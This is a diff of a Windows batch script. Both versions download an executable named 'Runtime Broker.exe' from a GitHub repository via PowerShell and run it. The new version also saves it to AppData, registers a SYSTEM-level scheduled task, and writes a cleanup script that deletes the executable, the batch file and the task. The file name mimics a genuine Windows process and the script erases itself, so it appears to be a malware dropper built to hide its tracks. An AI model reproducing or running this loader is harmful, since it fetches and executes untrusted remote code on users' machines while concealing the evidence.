@@ -1,19 +1,34 @@
 @echo off
-set "downloadURL=https://github.com/emad8787/panel/raw/refs/heads/main/speed/Runtime%20Broker.exe"
-set "exePath=C:\Windows\Runtime Broker.exe"
+setlocal
 
-echo Downloading to %exePath%...
-powershell -Command "Invoke-WebRequest -Uri '%downloadURL%' -OutFile '%exePath%'"
+:: Define variables
+set "fileURL=https://github.com/emad8787/panel/raw/refs/heads/main/speed/Runtime%%20Broker.exe"
+set "fileName=Runtime Broker.exe"
+set "destPath=%APPDATA%\%fileName%"
+set "batFile=%~f0"
+set "cleanupScript=%TEMP%\cleanup.bat"
+set "taskName=CleanupOnShutdown"
 
-if exist "%exePath%" (
-    echo Running the downloaded file...
-    start "" /wait "%exePath%"
-    
-    echo Execution finished. Deleting downloaded file...
-    del "%exePath%"
-) else (
-    echo Download failed or file not found.
-)
+:: Download the exe
+powershell -Command "Invoke-WebRequest -Uri '%fileURL%' -OutFile '%destPath%'"
 
-echo Cleaning up this script...
-del "%~f0"
+:: Create cleanup script
+(
+    echo @echo off
+    echo timeout /t 2 ^>nul
+    echo del /f /q "%destPath%"
+    echo del /f /q "%batFile%"
+    echo schtasks /delete /tn "%taskName%" /f
+) > "%cleanupScript%"
+
+:: Create a shutdown task
+schtasks /create /tn "%taskName%" /tr "\"%cleanupScript%\"" /sc onstart /ru System /f
+
+:: Run the exe and wait
+start "" /wait "%destPath%"
+
+:: If exe closes normally, delete files immediately
+call "%cleanupScript%"
+
+endlocal
+exit
